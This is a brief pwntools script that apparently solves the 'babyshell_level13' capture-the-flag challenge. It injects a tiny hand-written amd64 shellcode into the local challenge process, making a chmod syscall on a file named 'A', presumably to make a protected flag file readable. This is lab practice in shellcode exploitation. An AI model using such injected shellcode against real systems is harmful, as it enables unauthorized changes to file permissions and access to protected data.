from pwn import *

context.arch = 'amd64'
#context.log_level = "debug"

p = process('/challenge/babyshell_level13')

shellcode = """
    push 0x41
    mov rdi, rsp
    mov sil, 0x4
    mov al, 0x5a
    syscall
"""

# Assemble the shellcode
shellcode = asm(shellcode)
print(shellcode)
print("\n\nlength of code is \n\n",len(shellcode))

p.send(shellcode)

# Interact with the process
p.interactive()